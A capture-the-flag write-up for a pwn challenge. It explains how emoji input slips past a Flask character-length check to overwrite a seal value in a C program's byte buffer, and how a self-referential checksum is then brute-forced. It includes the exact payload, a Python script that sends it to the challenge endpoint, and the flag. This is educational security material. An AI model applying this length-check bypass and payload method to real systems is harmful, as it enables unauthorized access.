# Most Secure Bank Of Endia

**Category:** Pwn · **Points:** 999

> This is the Most Secure bEnk Of End-iya 😈 &nbsp; `http://35.254.226.167:5000`

**Flag:** `kBxAc{___h4ck1ng_b4nk_m41nfr4m3_w1th_3m0j15_1n_b1g_2026_w1th_0ps3*_l3v3l_🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃___}`

---

## The short version

The website checks that a username and password are at most 16 **characters** each. Then it sends them to a small C program called `ledgerd`, which works with **bytes**. An emoji is one character to Python but usually four bytes to C. We used that difference to write past a special value in `ledgerd`'s input buffer, then solved a small checksum puzzle to make the program believe the vault seal was valid.

No SQL injection or `/admin` login was needed. Those were distractions.

## What the app does

The useful endpoint is `POST /api/vault/auth`. Its Flask code makes a line like this and passes it to `ledgerd`:

```python
frame = f"{user}|{pw}\n"
```

Before doing that, Flask checks `len(user) <= 16` and `len(pw) <= 16`. In Python, `len("😀")` is `1`, although that emoji becomes **four UTF-8 bytes** when it is sent to the C program. That is our opening.

Looking at `ledgerd`'s machine code showed that it:

1. Reads the frame with `fgets` into a stack buffer.
2. Looks for the `|` separator and copies the username if the separator is within the first 64 bytes.
3. Checks a four-byte value at input offsets **72–75**. It starts as `0x13371337`, but the program only unlocks if it has become `0x5a434288`.
4. Calculates a 32-bit FNV-1a hash of input bytes **0–79**.
5. Reads input bytes **76–79** as four hexadecimal digits. Those digits must equal the hash's low 16 bits XOR `0x1998`.

So we need an input that fits Flask's character limits but puts exactly the right bytes at those offsets.

## Building the payload

The username is one `😁` followed by fourteen `😀` emojis. That is only **15 Python characters**, but **60 UTF-8 bytes**. The `|` separator is byte 60, safely inside `ledgerd`'s username limit, and the password starts at byte 61.

The password begins with two `😀` emojis and `𐀈`. Each is four bytes, so they fill bytes 61–72. The final UTF-8 byte of `𐀈` is `0x88`. We then append ASCII `BCZ`, giving these bytes at the seal's location:

```text
offset:  72 73 74 75
bytes:   88 42 43 5a
```

As a little-endian 32-bit number, `88 42 43 5a` is exactly **`0x5a434288`**. That passes the first check.

Four bytes remain at offsets 76–79 for the hex checksum. The annoying part is that these four characters are *also included in the hash*, so the checksum depends on itself. There are only `16^4 = 65,536` possible four-digit hex strings, though. A quick local search found `d174`:

```text
FNV-1a(bytes 0–79) = 0xf8a1c8ec
0xc8ec XOR 0x1998   = 0xd174
```

The completed credentials are:

```python
user = '😁' + '😀' * 14
password = '😀😀𐀈BCZd174'
```

The password is just **10 Python characters**, and the whole frame is exactly 80 bytes before its newline. Both Flask length checks pass.

## Testing and getting the flag

I tested the frame against the provided `ledgerd` binary and then through Flask's local test client. Both produced `VAULT SEAL INTEGRITY VERIFIED -- UNLOCKED` and `ok: true`. The key printed by the local binary came from this machine's `/flag.txt` test fixture, **not** from the challenge server.

Here is a minimal script to send the same payload to the remote endpoint:

```python
import json
import urllib.request

url = 'http://35.254.226.167:5000/api/vault/auth'
payload = {
    'user': '😁' + '😀' * 14,
    'pass': '😀😀𐀈BCZd174',
}

body = json.dumps(payload, ensure_ascii=False).encode('utf-8')
request = urllib.request.Request(
    url,
    data=body,
    headers={'Content-Type': 'application/json'},
    method='POST',
)

with urllib.request.urlopen(request) as response:
    print(json.load(response)['ledger'])
```

The remote server returned `ok: true` and this flag (there are **11** `🫃` emojis):

```text
kBxAc{___h4ck1ng_b4nk_m41nfr4m3_w1th_3m0j15_1n_b1g_2026_w1th_0ps3*_l3v3l_🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃___}
```

## Takeaway

The web app counted Unicode characters, but the native program acted on encoded bytes. The emoji let a short-looking input reach bytes the developer probably thought were out of reach. The remaining checksum was small enough to solve by trying every possible four-digit hex value locally.
